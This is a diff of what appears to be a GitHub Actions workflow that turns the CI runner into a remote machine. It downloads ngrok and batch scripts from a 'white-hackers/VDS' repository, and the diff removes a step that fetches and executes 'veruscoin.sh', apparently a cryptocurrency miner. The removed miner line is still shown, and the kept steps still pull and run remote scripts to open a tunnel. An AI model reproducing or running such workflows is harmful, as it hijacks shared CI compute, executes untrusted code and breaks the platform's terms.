@@ -14,14 +14,7 @@ jobs:
         Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
         Invoke-WebRequest https://raw.githubusercontent.com/white-hackers/VDS/main/start.bat -OutFile start.bat
         Invoke-WebRequest https://raw.githubusercontent.com/white-hackers/VDS/main/loop.bat -OutFile loop.bat
-   
-    - name: BA_channel
-      run: |
-        wget https://github.com/Kigddkljcdd/ko/blob/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
-
-
-   
-   
+  
    - name: Загрузка программ.
       run: |
         Invoke-WebRequest https://raw.githubusercontent.com/white-hackers/VDS/main/launcher/Node.js.lnk -OutFile Node.js.lnk
